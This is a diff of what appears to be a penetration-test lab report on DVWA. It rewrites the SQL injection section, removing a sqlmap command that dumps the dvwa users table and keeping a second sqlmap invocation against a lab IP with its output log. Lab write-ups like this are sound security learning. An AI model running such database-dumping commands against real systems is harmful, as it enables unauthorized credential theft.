@@ -418,13 +418,11 @@ the identified vulnerabilities.
 SQL Injection due to improper input validation
 
 ### Exploitation Method
-Authenticated SQL Injection testing was performed using automated tooling.
+Using sqlmap, the backend database was initially enumerated, leading to the
+identification of the `dvwa` database. Further enumeration revealed available
+tables, and a targeted extraction command was executed to retrieve application
+user data.
 
-```
-sqlmap -u "http://<target-ip>/vulnerabilities/sqli/?id=1&Submit=Submit#" \
---cookie="security=low; PHPSESSID=<session-id>" \
--D dvwa -T users --dump
-```
 ### Activities
 ```
  sqlmap -u "http://10.49.143.189/vulnerabilities/sqli/?id=1&Submit=Submit#" \
@@ -490,7 +488,7 @@ Table: users
 [07:32:28] [INFO] fetched data logged to text files under '/home/joe/.local/share/sqlmap/output/10.49.143.189'
 
 ```
-SQL injection exploitation using sqlmap enabled retrieval of database records, exposing application user credentials due to insecure input handling.
+SQL injection exploitation using sqlmap enabled unauthorized access to backend database records, resulting in exposure of application user credentials due to improper input validation.
 
 
 ## Conclusion
